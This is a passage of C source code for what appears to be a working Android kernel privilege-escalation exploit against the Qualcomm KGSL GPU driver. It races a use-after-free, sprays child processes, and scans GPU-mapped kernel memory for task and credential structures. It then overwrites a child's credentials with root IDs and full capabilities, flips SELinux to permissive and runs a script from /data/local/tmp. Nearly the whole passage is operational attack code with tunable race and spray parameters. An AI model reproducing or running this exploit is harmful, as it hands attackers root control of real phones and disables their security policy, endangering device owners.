        if (kgsl_submit(fd, ctx, ib_id, ib_gpu, ib_vma, bytes) < 0) return -1;
        __sync_synchronize();
        if (msync(dump_vma, (size_t)n * words_per_page * 8,
                  MS_SYNC | MS_INVALIDATE) < 0) { /* ignore */ }
        for (uint64_t p = 0; p < n; p++) {
            for (size_t k = 0; k < words_per_page; k++) {
                unsigned char *c = dump + (p * words_per_page + k) * 8;
                uint64_t sample = 0;
                memcpy(&sample, c, sizeof(sample));
                sampled_values++;
                if (sample != 0) {
                    nonzero_values++;
                    if (diagnostics && diagnostic_samples < 8) {
                        uint64_t relative =
                            ((first + p) * PAGE_SIZE) + cand[k];
                        fprintf(stderr,
                                "[*] scan sample offset=%llx value=%016llx\n",
                                (unsigned long long)relative,
                                (unsigned long long)sample);
                        diagnostic_samples++;
                    }
                }
                if (c[0] != 'A') continue;
                marker_count++;
                pid_t pid;
                if (!parse_child_pid(c, &pid)) continue;
                int idx = -1;
                for (int i = 0; i < g_child_count; i++)
                    if (ctrls[i].pid == pid) { idx = i; break; }
                if (idx < 0) continue;
                pid_count++;
                uint64_t page = uaf_base + ((first + p) * PAGE_SIZE);
                uint64_t base = page + cand[k] - profile->task_comm;
                if (base < uaf_base + PAGE_SIZE) continue;
                uint32_t al[2] = {0};
                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                   dump_id, dump_gpu, dump_vma,
                                   base + profile->task_addr_limit, al, 2) < 0)
                    continue;
                uint64_t alv = ((uint64_t)al[1] << 32) | al[0];
                if (alv != profile->user_ds &&
                    alv != 0xffffffffffffffffULL)
                    continue;
                addr_limit_count++;
                uint32_t tids[2] = {0};
                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                   dump_id, dump_gpu, dump_vma,
                                   base + profile->task_pid, tids, 2) < 0)
                    continue;
                if (tids[0] != (uint32_t)pid ||
                    tids[1] != (uint32_t)pid) {
                    task_identity_mismatch_count++;
                    continue;
                }
                task_identity_count++;
                uint32_t cw[2] = {0};
                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                   dump_id, dump_gpu, dump_vma,
                                   base + profile->task_cred, cw, 2) < 0)
                    continue;
                uint64_t cred = ((uint64_t)cw[1] << 32) | cw[0];
                if ((cred & 0xffff000000000000ULL) != 0xffff000000000000ULL ||
                    (cred & 7))
                    continue;
                cred_count++;
                uint32_t real_words[2] = {0};
                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                   dump_id, dump_gpu, dump_vma,
                                   base + profile->task_real_cred, real_words, 2) < 0)
                    continue;
                uint64_t real_cred = ((uint64_t)real_words[1] << 32) |
                                     real_words[0];
                if (real_cred != cred)
                    continue;
                int duplicate = 0;
                for (size_t i = 0; i < *candidate_count; i++) {
                    if (candidates[i].pid == pid) {
                        duplicate = 1;
                        break;
                    }
                }
                if (duplicate) continue;
                candidates[*candidate_count] = (struct found) {
                    .page = base,
                    .cred = cred,
                    .pid = pid,
                    .idx = idx,
                };
                (*candidate_count)++;
                printf("[+] task base=%llx pid=%d cred=%llx idx=%d\n",
                       (unsigned long long)base, pid,
                       (unsigned long long)cred, idx);
                if (*candidate_count == candidate_capacity) {
                    printf("[+] collected %zu writable child task_structs\n",
                           *candidate_count);
                    return 0;
                }
            }
        }
        if (verbose &&
            ((first - SCAN_FIRST_PAGE) % 8192) == 0)
            printf("[*] scanned pages %llu/%llu\n", (unsigned long long)first, (unsigned long long)pages);
    }
    if (*candidate_count) {
        printf("[+] collected %zu writable child task_structs\n",
               *candidate_count);
        if (diagnostics)
            fprintf(stderr,
                    "[*] scan diagnostics samples=%llu nonzero=%llu markers=%llu\n",
                    (unsigned long long)sampled_values,
                    (unsigned long long)nonzero_values,
                    (unsigned long long)marker_count);
        return 0;
    }
    if (diagnostics)
        fprintf(stderr,
                "[*] scan diagnostics samples=%llu nonzero=%llu markers=%llu\n",
                (unsigned long long)sampled_values,
                (unsigned long long)nonzero_values,
                (unsigned long long)marker_count);
    fprintf(stderr, "[-] scan candidates markers=%llu pids=%llu addr_limit=%llu task_identities=%llu task_id_mismatches=%llu creds=%llu\n",
            (unsigned long long)marker_count,
            (unsigned long long)pid_count,
            (unsigned long long)addr_limit_count,
            (unsigned long long)task_identity_count,
            (unsigned long long)task_identity_mismatch_count,
            (unsigned long long)cred_count);
    return -1;
}

static int scan_credential_aliases(
        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
        uint64_t ib_bytes,
        unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
        uint64_t uaf_base, const struct found *task,
        struct cred_alias_candidate **candidates_out, size_t *count_out) {
    struct cred_template expected = {0};
    if (read_cred_template(&expected) < 0) return -1;

    uint64_t pages = UAF_SIZE / PAGE_SIZE;
    if (pages > SCAN_MAX_PAGES) pages = SCAN_MAX_PAGES;
    uint64_t cred_page_offset = task->cred & (PAGE_SIZE - 1);
    if (cred_page_offset > PAGE_SIZE - CRED_WORDS * sizeof(uint32_t)) {
        errno = EINVAL;
        return -1;
    }

    struct cred_alias_candidate *candidates =
        calloc((size_t)pages, sizeof(*candidates));
    if (!candidates) return -1;

    uint32_t *cmd = ib_vma;
    uint32_t *dump_words = dump_vma;
    size_t candidate_count = 0;
    for (uint64_t first = SCAN_FIRST_PAGE; first < pages;
         first += CRED_SCAN_PAGES_PER_BATCH) {
        uint64_t count = pages - first;
        if (count > CRED_SCAN_PAGES_PER_BATCH)
            count = CRED_SCAN_PAGES_PER_BATCH;
        int dw = 0;
        cmd[dw++] = pkt(CP_NOP, 0);
        for (uint64_t page = 0; page < count; page++) {
            uint64_t alias = uaf_base + (first + page) * PAGE_SIZE +
                             cred_page_offset;
            for (int word = 0; word < CRED_WORDS; word++) {
                uint32_t dlo, dhi, slo, shi;
                split64(dump_gpu + (page * CRED_WORDS + (uint64_t)word) * 4,
                        &dlo, &dhi);
                split64(alias + (uint64_t)word * 4, &slo, &shi);
                cmd[dw++] = pkt(CP_MEM_TO_MEM, 5);
                cmd[dw++] = 0;
                cmd[dw++] = dlo; cmd[dw++] = dhi;
                cmd[dw++] = slo; cmd[dw++] = shi;
            }
        }
        cmd[dw++] = pkt(CP_NOP, 0);
        size_t bytes = (size_t)dw * sizeof(uint32_t);
        size_t dump_bytes = (size_t)count * CRED_WORDS * sizeof(uint32_t);
        if (bytes > ib_bytes || dump_bytes > KM_DUMP_BUFFER_SIZE) {
            free(candidates);
            errno = EOVERFLOW;
            return -1;
        }
        if (kgsl_submit(fd, ctx, ib_id, ib_gpu, ib_vma, bytes) < 0) {
            free(candidates);
            return -1;
        }
        __sync_synchronize();
        if (msync(dump_vma, dump_bytes, MS_SYNC | MS_INVALIDATE) < 0) { /* ignore */ }

        for (uint64_t page = 0; page < count; page++) {
            const uint32_t *words = dump_words + page * CRED_WORDS;
            if (words[0] != 2 || words[9] != expected.securebits ||
                memcmp(words + 1, expected.ids, sizeof(expected.ids)) != 0 ||
                memcmp(words + 10, expected.cap_sets,
                       sizeof(expected.cap_sets)) != 0)
                continue;

            struct cred_alias_candidate *candidate =
                &candidates[candidate_count++];
            candidate->alias = uaf_base + (first + page) * PAGE_SIZE +
                               cred_page_offset;
            memcpy(candidate->ids, words + 1, sizeof(candidate->ids));
            memcpy(candidate->caps, words + 12, sizeof(candidate->caps));
            if (getenv("KGSL_SCAN_DIAGNOSTICS"))
                fprintf(stderr,
                        "[*] cred alias=%016llx usage=%u ids=%u,%u,%u,%u,%u,%u,%u,%u\n",
                        (unsigned long long)candidate->alias, words[0],
                        words[1], words[2], words[3], words[4], words[5],
                        words[6], words[7], words[8]);
        }
        if (verbose && first % 8192 == SCAN_FIRST_PAGE)
            printf("[*] scanned credential aliases %llu/%llu\n",
                   (unsigned long long)first, (unsigned long long)pages);
    }

    if (!candidate_count) {
        free(candidates);
        errno = ENOENT;
        return -1;
    }

    cred_candidate_anchor = (task->page & ~(PAGE_SIZE - 1)) +
                            cred_page_offset;
    qsort(candidates, candidate_count, sizeof(*candidates),
          compare_cred_candidates);
    *candidates_out = candidates;
    *count_out = candidate_count;
    printf("[+] credential aliases matching selected child: %zu\n",
           candidate_count);
    return 0;
}

static int patch_credential_alias(
        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
        unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
        const struct cred_alias_candidate *candidate,
        const struct target_profile *profile) {
    uint32_t root_ids[CRED_IDS_LEN / sizeof(uint32_t)] = {0};
    uint32_t observed_ids[CRED_IDS_LEN / sizeof(uint32_t)] = {0};
    uint32_t observed_caps[CRED_CAPS_LEN / sizeof(uint32_t)] = {0};
    uint32_t cap_mask[2];
    uint32_t root_caps[CRED_CAPS_LEN / sizeof(uint32_t)];
    int failure = 0;

    if (!profile->cred_ids || !profile->cred_caps ||
        profile->cap_last_cap < 32 || profile->cap_last_cap > 62) {
        errno = EINVAL;
        return -1;
    }
    cap_mask[0] = UINT32_MAX;
    cap_mask[1] = (1U << (profile->cap_last_cap - 31)) - 1U;
    for (size_t i = 0; i < sizeof(root_caps) / sizeof(root_caps[0]); i++)
        root_caps[i] = cap_mask[i & 1];

    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        candidate->alias + profile->cred_ids, root_ids,
                        CRED_IDS_LEN / sizeof(uint32_t)) < 0) {
        failure = errno ? errno : EIO;
        goto rollback;
    }
    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        candidate->alias + profile->cred_caps, root_caps,
                        CRED_CAPS_LEN / sizeof(uint32_t)) < 0) {
        failure = errno ? errno : EIO;
        goto rollback;
    }
    if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                       dump_id, dump_gpu, dump_vma,
                       candidate->alias + profile->cred_ids, observed_ids,
                       CRED_IDS_LEN / sizeof(uint32_t)) < 0 ||
        gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                       dump_id, dump_gpu, dump_vma,
                       candidate->alias + profile->cred_caps, observed_caps,
                       CRED_CAPS_LEN / sizeof(uint32_t)) < 0) {
        failure = errno ? errno : EIO;
        goto rollback;
    }
    if (memcmp(observed_ids, root_ids, sizeof(root_ids)) != 0 ||
        memcmp(observed_caps, root_caps, sizeof(root_caps)) != 0) {
        failure = EIO;
        goto rollback;
    }
    return 0;

rollback:
    (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                          candidate->alias + profile->cred_caps,
                          candidate->caps, CRED_CAPS_LEN / sizeof(uint32_t));
    (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                          candidate->alias + profile->cred_ids,
                          candidate->ids, CRED_IDS_LEN / sizeof(uint32_t));
    errno = failure;
    return -1;
}

static int restore_credential_alias(
        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
        const struct cred_alias_candidate *candidate,
        const struct target_profile *profile) {
    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        candidate->alias + profile->cred_caps,
                        candidate->caps,
                        CRED_CAPS_LEN / sizeof(uint32_t)) < 0)
        return -1;
    return gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                           candidate->alias + profile->cred_ids,
                           candidate->ids,
                           CRED_IDS_LEN / sizeof(uint32_t));
}

static int patch_any_child_credential(
        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
        unsigned dump_id, uint64_t dump_gpu, void *dump_vma, uint64_t uaf_gpu,
        const struct found *task_candidates, size_t task_candidate_count,
        struct found *root_child, uint64_t *selected_cred_alias)
{
    int root_verified = 0;
    int credential_scan_failed = 0;
    uint64_t scanned_cred_offsets[MAX_TASK_CANDIDATES] = {0};
    size_t scanned_cred_offset_count = 0;

    for (size_t anchor = 0;
         anchor < task_candidate_count && !root_verified; anchor++) {
        uint64_t cred_offset =
            task_candidates[anchor].cred & (PAGE_SIZE - 1);
        int duplicate_offset = 0;
        for (size_t i = 0; i < scanned_cred_offset_count; i++) {
            if (scanned_cred_offsets[i] == cred_offset) {
                duplicate_offset = 1;
                break;
            }
        }
        if (duplicate_offset) continue;
        scanned_cred_offsets[scanned_cred_offset_count++] = cred_offset;
        printf("[*] scanning credential aliases at page offset=%03llx from pid=%d\n",
               (unsigned long long)cred_offset,
               (int)task_candidates[anchor].pid);

        struct cred_alias_candidate *cred_candidates = NULL;
        size_t cred_candidate_count = 0;
        if (scan_credential_aliases(
                fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                dump_id, dump_gpu, dump_vma, uaf_gpu,
                &task_candidates[anchor], &cred_candidates,
                &cred_candidate_count) < 0) {
            if (errno == ENOENT) continue;
            perror("scan child credential aliases");
            credential_scan_failed = 1;
            break;
        }

        for (size_t i = 0; i < cred_candidate_count; i++) {
            printf("[*] checking credential alias %zu/%zu\n",
                   i + 1, cred_candidate_count);
            if (patch_credential_alias(
                    fd, ctx, ib_id, ib_gpu, ib_vma,
                    dump_id, dump_gpu, dump_vma,
                    &cred_candidates[i], g_target) < 0) {
                perror("patch credential alias");
                continue;
            }
            for (size_t task = 0; task < task_candidate_count; task++) {
                pid_t pid = task_candidates[task].pid;
                if (!proc_task_has_root_credentials(
                        pid, g_target->cap_last_cap))
                    continue;
                *root_child = task_candidates[task];
                *selected_cred_alias = cred_candidates[i].alias;
                root_verified = 1;
                printf("[+] child %d uses credential alias candidate %zu\n",
                       pid, i + 1);
                break;
            }
            if (root_verified) break;
            if (restore_credential_alias(
                    fd, ctx, ib_id, ib_gpu, ib_vma,
                    &cred_candidates[i], g_target) < 0) {
                perror("restore unmatched credential alias");
                credential_scan_failed = 1;
                break;
            }
        }
        free(cred_candidates);
        if (credential_scan_failed) break;
    }

    if (credential_scan_failed) {
        errno = EIO;
        return -1;
    }
    return root_verified ? 0 : -1;
}

static int wait_for_root_credentials(int idx, int timeout_ms) {
    int last_stage = 0;
    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 10) {
        __sync_synchronize();
        int stage = ctrls[idx].root_stage;
        if (stage != last_stage) {
            printf("[*] child root-verification stage=%d\n", stage);
            last_stage = stage;
        }
        if (ctrls[idx].root_done) {
            if (ctrls[idx].error) {
                errno = ctrls[idx].error;
                return -1;
            }
            return 0;
        }
        usleep(10000);
    }
    errno = ETIMEDOUT;
    return -1;
}

static int read_proc_task_state(pid_t pid, char *state)
{
    char path[64], buffer[512];
    int path_len = snprintf(path, sizeof(path), "/proc/%d/stat", (int)pid);
    if (path_len < 0 || (size_t)path_len >= sizeof(path)) {
        errno = EOVERFLOW;
        return -1;
    }
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t length;
    do { length = read(fd, buffer, sizeof(buffer) - 1); }
    while (length < 0 && errno == EINTR);
    int saved_errno = errno;
    close(fd);
    errno = saved_errno;
    if (length <= 0) {
        if (length == 0) errno = EIO;
        return -1;
    }
    buffer[length] = '\0';
    char *end = strrchr(buffer, ')');
    if (!end || end[1] != ' ' || end[2] == '\0') {
        errno = EPROTO;
        return -1;
    }
    *state = end[2];
    return 0;
}

static int pin_parent_for_spray(void) {
    /*
     * Only capture the caller's mask once.  Every call ends by pinning the
     * process to the park CPU, so re-reading sched_getaffinity() here would
     * collapse the allowed set to {park} and silently put the racer on the
     * same CPU as the mmap after the first call.
     */
    if (!g_affinity_captured) {
        if (sched_getaffinity(0, sizeof(g_allowed_cpus), &g_allowed_cpus) < 0)
            return -1;
        g_affinity_captured = 1;
    }
    long configured_cpu = 0;
    int env_status = read_env_long("KGSL_CPU", 0, CPU_SETSIZE - 1,
                                   &configured_cpu);
    if (env_status < 0) {
        fprintf(stderr, "[-] KGSL_CPU must be between 0 and %d\n",
                CPU_SETSIZE - 1);
        return -1;
    }
    if (env_status > 0) {
        g_park_cpu = (int)configured_cpu;
        if (!CPU_ISSET(g_park_cpu, &g_allowed_cpus)) {
            fprintf(stderr, "[-] KGSL_CPU %d is outside the allowed CPU set\n",
                    g_park_cpu);
            errno = EINVAL;
            return -1;
        }
    } else {
        for (int cpu = CPU_SETSIZE - 1; cpu >= 0; cpu--) {
            if (CPU_ISSET(cpu, &g_allowed_cpus)) {
                g_park_cpu = cpu;
                break;
            }
        }
    }
    if (g_park_cpu < 0) {
        errno = ENODEV;
        return -1;
    }
    long configured_race = 0;
    int race_env = read_env_long("KGSL_RACE_CPU", 0, CPU_SETSIZE - 1,
                                 &configured_race);
    if (race_env < 0) {
        fprintf(stderr, "[-] KGSL_RACE_CPU must be between 0 and %d\n",
                CPU_SETSIZE - 1);
        return -1;
    }
    if (race_env > 0) {
        g_race_cpu = (int)configured_race;
        if (!CPU_ISSET(g_race_cpu, &g_allowed_cpus)) {
            fprintf(stderr,
                    "[-] KGSL_RACE_CPU %d is outside the allowed CPU set\n",
                    g_race_cpu);
            errno = EINVAL;
            return -1;
        }
    } else {
        g_race_cpu = -1;
        for (int cpu = CPU_SETSIZE - 1; cpu >= 0; cpu--) {
            if (CPU_ISSET(cpu, &g_allowed_cpus) && cpu != g_park_cpu) {
                g_race_cpu = cpu;
                break;
            }
        }
        if (g_race_cpu < 0)
            g_race_cpu = g_park_cpu;
    }
    CPU_ZERO(&g_race_mask);
    CPU_SET(g_race_cpu, &g_race_mask);
    CPU_ZERO(&g_park_mask);
    CPU_SET(g_park_cpu, &g_park_mask);
    if (sched_setaffinity(0, sizeof(g_park_mask), &g_park_mask) < 0)
        return -1;
    for (int i = 0; i < 8; i++) syscall(SYS_sched_yield);
    if (sched_getcpu() != g_park_cpu) {
        errno = EAGAIN;
        return -1;
    }
    printf("[*] pinning child allocation to CPU %d, race mmap on CPU %d, racer(s) on CPU %d\n",
           g_park_cpu, g_park_cpu, g_race_cpu);
    if (g_race_cpu == g_park_cpu)
        fprintf(stderr,
                "[-] no second CPU for the race: the mmap and the racer are"
                " both on CPU %d (unset KGSL_CPU/KGSL_RACE_CPU or pick two"
                " CPUs)\n", g_park_cpu);
    return 0;
}

static int restore_parent_affinity(void) {
    if (g_park_cpu < 0) {
        errno = EINVAL;
        return -1;
    }
    return sched_setaffinity(0, sizeof(g_allowed_cpus), &g_allowed_cpus);
}

/*
 * The pressure forces the KGSL pool shrinker to return the freed object's
 * pages.  Unmapping it again before the fork spray puts all those pages back
 * on top of the free lists, so the task_struct slabs tend to take pressure
 * pages instead of the freed GPU ones.  Keeping it resident across the fork
 * (KGSL_PRESSURE_HOLD=1) makes the spray allocate from what is left free.
 * MADV_DONTFORK keeps the 8k children from copying the mapping's page
 * tables, which would otherwise dwarf the spray itself.
 */
static void apply_kgsl_pressure(void) {
    if (!g_pressure_bytes || g_pressure_map) return;
    printf("[*] memory pressure to drain KGSL pool\n");
    void *pressure_map = mmap(NULL, g_pressure_bytes,
        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pressure_map == MAP_FAILED) {
        perror("pressure mmap");
        return;
    }
    for (size_t off = 0; off < g_pressure_bytes; off += PAGE_SIZE)
        ((volatile unsigned char *)pressure_map)[off] = 1;
    if (madvise(pressure_map, g_pressure_bytes, MADV_DONTFORK) < 0) {
        perror("pressure MADV_DONTFORK");
        munmap(pressure_map, g_pressure_bytes);
        return;
    }
    g_pressure_map = pressure_map;
    g_pressure_size = g_pressure_bytes;
    printf("[+] pressure %zu MiB resident\n", g_pressure_size >> 20);
}

static void release_kgsl_pressure(void) {
    if (!g_pressure_map) return;
    munmap(g_pressure_map, g_pressure_size);
    g_pressure_map = NULL;
    g_pressure_size = 0;
    printf("[*] pressure released\n");
}

/* Drop everything a failed round owns so the next one starts clean. */
static void abandon_round(int *fd, unsigned *ib_id, void **ib_vma,
                          unsigned *dump_id, void **dump_vma) {
    release_kgsl_pressure();
    if (*ib_vma) {
        munmap(*ib_vma, IB_SIZE);
        *ib_vma = NULL;
    }
    if (*dump_vma) {
        munmap(*dump_vma, KM_DUMP_BUFFER_SIZE);
        *dump_vma = NULL;
    }
    if (*fd >= 0) {
        kgsl_free(*fd, *ib_id);
        kgsl_free(*fd, *dump_id);
        close(*fd);
        *fd = -1;
    }
    *ib_id = 0;
    *dump_id = 0;
    kill_children_except(-1);
    for (int i = 0; i < g_child_count; i++)
        memset(&ctrls[i], 0, sizeof(ctrls[i]));
}

static int sec_read_enforce(void) {
    int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    char value[8] = {0};
    ssize_t n = read(fd, value, sizeof(value) - 1);
    close(fd);
    if (n <= 0) return -1;
    return value[0] == '0' ? 0 : 1;
}

/*
 * The raw thread.cpu_context store only flips selinux_state.enforcing; init
 * and the property service cache their own AVC enforcing state and never see
 * it.  Writing the selinuxfs enforce node goes through security_setenforce(),
 * which updates the status page and broadcasts the AVC netlink event.
 */
static void setenforce_permissive(void) {
    int fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (fd < 0) {
        fprintf(stderr, "[-] selinuxfs setenforce: %s\n", strerror(errno));
        return;
    }
    if (write(fd, "0", 1) != 1)
        fprintf(stderr, "[-] selinuxfs setenforce: %s\n", strerror(errno));
    close(fd);
}

static void run_policy_fix(void) {
    /* system()'s sh loses the root child's capabilities, so it cannot write
     * the log into the shell-owned /data/local/tmp (0771).  Make the
     * directory writable first, then run the slow reload in the background. */
    (void)chmod("/data/local/tmp", 0777);
    if (access("/data/local/tmp/policy_fix.sh", X_OK) == 0)
        (void)system("/data/local/tmp/policy_fix.sh >/dev/null 2>&1 &");
}

static void sec_report_permissive(uint64_t kaslr, pid_t pid) {
    char state = '?';
    if (read_proc_task_state(pid, &state) < 0) state = '?';
    int enforce = sec_read_enforce();
    printf("[*] hijack kaslr=%016llx child state=%c enforce=%d\n",
           (unsigned long long)kaslr, state, enforce);
    if (!kaslr) return;
    if (enforce == 0)
        printf("[+] SELinux is now permissive for this boot\n");
    else
        fprintf(stderr, "[-] hijack ran but selinux_state.enforcing still"
                        " reads %d\n", enforce);
}

static void choose_spray_defaults(int children_set, int pressure_set) {
    unsigned long total_mb = 0, avail_mb = 0;
    FILE *mem = fopen("/proc/meminfo", "r");
    if (mem) {
        char line[256];
        while (fgets(line, sizeof(line), mem)) {
            unsigned long kb;
            if (sscanf(line, "MemTotal: %lu kB", &kb) == 1)
                total_mb = kb / 1024;
            else if (sscanf(line, "MemAvailable: %lu kB", &kb) == 1)
                avail_mb = kb / 1024;
        }
        fclose(mem);
    }
    if (!children_set) {
        int children = 4000;
        if (total_mb >= 7000)
            children = 8192;
        else if (total_mb >= 5000)
            children = 6144;
        if (children > MAX_CHILDREN)
            children = MAX_CHILDREN;
        g_child_count = children;
    }
    if (!pressure_set) {
        unsigned long base = avail_mb ? avail_mb : total_mb;
        if (!base)
            base = 4096;
        unsigned long p = base * 60 / 100;
        if (p < 1024)
            p = 1024;
        if (p > 4096)
            p = 4096;
        g_pressure_bytes = (size_t)p * 1024 * 1024;
    }
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    g_start_ms = now_ms();

    g_target = target_profile_get();
    printf("[*] target %s, %s\n", g_target->model, g_target->kernel_release);
    if (!g_target->task_addr_limit || !g_target->task_real_cred ||
        !g_target->task_cred || !g_target->task_comm || !g_target->task_stride ||
        !g_target->cred_ids || !g_target->cred_caps ||
        g_target->cap_last_cap < 32 || g_target->cap_last_cap > 62) {
        fprintf(stderr, "[-] no verified credential profile for %s\n",
                g_target->model);
        return 2;
    }
    int sec_sid_mode = getenv("SEC_SID") != NULL;
    int sec_perm_mode = env_flag("SEC_PERMISSIVE", 1);
    long configured = 0;
    int children_set = 0, pressure_set = 0;
    int env_status = read_env_long("KGSL_CHILDREN", 512, MAX_CHILDREN,
                                   &configured);
    if (env_status < 0) {
        fprintf(stderr, "[-] KGSL_CHILDREN must be between 512 and %d\n",
                MAX_CHILDREN);
        return 2;
    }
    if (env_status > 0) {
        g_child_count = (int)configured;
        children_set = 1;
    }
    env_status = read_env_long("KGSL_PRESSURE_MB", 0, 5120, &configured);
    if (env_status < 0) {
        fprintf(stderr, "[-] KGSL_PRESSURE_MB must be between 0 and 5120\n");
        return 2;
    }
    if (env_status > 0) {
        g_pressure_bytes = (size_t)configured * 1024 * 1024;
        pressure_set = 1;
    }
    long configured_racers = 1;
    env_status = read_env_long("KGSL_RACERS", 1, MAX_RACERS,
                               &configured_racers);
    if (env_status < 0) {
        fprintf(stderr, "[-] KGSL_RACERS must be between 1 and %d\n",
                MAX_RACERS);
        return 2;
    }
    if (env_status > 0)
        g_racer_count = (int)configured_racers;
    long configured_delay = 0;
    env_status = read_env_long("KGSL_RACE_DELAY_US", 0, 100000,
                               &configured_delay);
    if (env_status < 0) {
        fprintf(stderr, "[-] KGSL_RACE_DELAY_US must be between 0 and 100000\n");
        return 2;
    }
    if (env_status > 0) {
        g_race_delay_us = (int)configured_delay;
        g_race_delay_fixed = 1;
    }
    long configured_retry = 0;
    env_status = read_env_long("KGSL_RACE_RETRY_MS", 0, 5000,
                               &configured_retry);
    if (env_status < 0) {
        fprintf(stderr, "[-] KGSL_RACE_RETRY_MS must be between 0 and 5000\n");
        return 2;
    }
    if (env_status > 0)
        g_race_retry_ms = (int)configured_retry;
    g_pressure_hold = env_flag("KGSL_PRESSURE_HOLD", 0);
    if (!children_set || !pressure_set)
        choose_spray_defaults(children_set, pressure_set);
    printf("[*] spray profile children=%d pressure=%zu MiB racers=%d delay=",
           g_child_count, g_pressure_bytes / (1024 * 1024), g_racer_count);
    if (g_race_delay_fixed)
        printf("%dus\n", g_race_delay_us);
    else
        printf("auto-sweep\n");
    printf("[*] pressure hold=%d retry=%dms\n", g_pressure_hold,
           g_race_retry_ms);
    if (sec_sid_mode && getenv("SEC_LOG")) {
        void *log = mmap(NULL, SEC_LOG_SIZE, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (log != MAP_FAILED) {
            memset(log, 0, SEC_LOG_SIZE);
            g_sec_log = log;
        }
    }
    if (sec_sid_mode && (getenv("SEC_DUMP2") || getenv("SEC_WRITE"))) {
        void *dbuf = mmap(NULL, SEC_DUMP_SIZE, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        void *dhdr = mmap(NULL, sizeof(struct sec_dump_hdr),
                          PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (dbuf != MAP_FAILED && dhdr != MAP_FAILED) {
            memset(dhdr, 0, sizeof(struct sec_dump_hdr));
            g_dump_buf = dbuf;
            g_dump_hdr = dhdr;
        }
    }

    ctrls = mmap(NULL, sizeof(struct ctrl) * (size_t)g_child_count,
                 PROT_READ | PROT_WRITE,
                 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ctrls == MAP_FAILED) {
        perror("control mmap");
        return 1;
    }
    memset(ctrls, 0, sizeof(struct ctrl) * (size_t)g_child_count);
    if (install_child_cleanup_handlers() < 0) {
        perror("install child cleanup handlers");
        return 1;
    }
    if (pin_parent_for_spray() < 0) {
        perror("pin KGSL race and child allocation CPU");
        return 1;
    }

    long rounds = 8;
    env_status = read_env_long("KGSL_ROUNDS", 1, 16, &rounds);
    if (env_status < 0) {
        fprintf(stderr, "[-] KGSL_ROUNDS must be between 1 and 16\n");
        return 2;
    }

    int fd = -1;
    uint64_t uaf_gpu = 0;
    unsigned ctx = 0, ib_id = 0, dump_id = 0;
    uint64_t ib_gpu = 0, dump_gpu = 0;
    void *ib_vma = NULL, *dump_vma = NULL;
    struct found root_child = {0};
    struct found task_candidates[MAX_TASK_CANDIDATES];
    size_t task_candidate_count = 0;
    uint64_t selected_cred_alias = 0;
    uint64_t root_task_kva = 0;
    int root_verified = 0;

    for (int round = 1; round <= (int)rounds && !root_verified; round++) {
        printf("[*] exploit round %d/%ld\n", round, rounds);
        if (pin_parent_for_spray() < 0) {
            perror("pin KGSL race and child allocation CPU");
            return 1;
        }

        int enomem_tries = 0;
        for (int attempt = 0; attempt < MAX_RACE_TRIES; attempt++) {
            g_race_delay_us = race_delay_for_try(attempt);
            printf("[*] race try %d delay=%dus\n", attempt + 1,
                   g_race_delay_us);
            if (race_once(&fd, &uaf_gpu) == 0) break;
            if (g_last_race_errno == ENOMEM)
                enomem_tries++;
            else
                enomem_tries = 0;
            if (g_race_retry_ms > 0)
                usleep((useconds_t)g_race_retry_ms * 1000);
        }
        if (fd < 0 && enomem_tries == MAX_RACE_TRIES) {
            fprintf(stderr,
                    "[-] KGSL returned ENOMEM on every try: the driver pool"
                    " is exhausted. Reboot the device before retrying.\n");
            return 1;
        }
        if (fd < 0) {
            fprintf(stderr, "[-] race not won\n");
            restore_parent_affinity();
            continue;
        }
        mark("race won");

        apply_kgsl_pressure();
        if (!g_pressure_hold)
            release_kgsl_pressure();
        mark("pressure done");

        printf("[*] spraying children\n");
        spray_children(fd);
        if (g_pressure_hold)
            release_kgsl_pressure();
        if (restore_parent_affinity() < 0) {
            perror("restore parent CPU affinity");
            abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
            continue;
        }
        int alive = 0;
        for (int i = 0; i < g_child_count; i++)
            if (ctrls[i].pid > 0) alive++;
        printf("[*] children=%d\n", alive);
        if (alive == 0 || wait_children_ready(alive, 60000) < 0) {
            fprintf(stderr, "[-] spray incomplete\n");
            abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
            continue;
        }
        mark("children ready");

